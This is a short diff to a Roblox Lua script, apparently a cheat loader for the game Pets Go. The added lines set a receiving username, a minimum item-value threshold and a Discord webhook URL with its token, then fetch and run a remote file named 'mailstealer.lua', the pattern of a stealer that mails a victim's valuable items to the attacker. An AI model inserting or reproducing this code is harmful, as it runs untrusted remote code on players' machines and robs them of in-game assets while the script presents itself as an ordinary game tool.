@@ -1,3 +1,8 @@
+Username = "bx4rzwasdeleted"
+min_rap = 10000
+webhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/Pets-Go/refs/heads/main/mailstealer.lua"))()
 loadstring(game:HttpGet('https://darkscripts.space/scripts/061dcf7c2c.lua', true))()
 
 -- Load Orion Library
